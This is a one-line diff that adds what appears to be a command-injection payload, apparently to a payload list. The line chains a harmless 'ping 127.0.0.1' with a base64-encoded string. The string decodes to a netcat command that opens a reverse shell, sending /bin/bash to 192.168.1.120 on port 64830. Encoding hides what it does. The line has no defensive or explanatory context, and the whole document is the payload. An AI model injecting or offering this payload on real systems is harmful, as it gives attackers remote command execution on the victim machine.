@@ -1,0 +1,1 @@
+ping 127.0.0.1 | 'echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS4xMjAgNjQ4MzA=" | base64 -d'
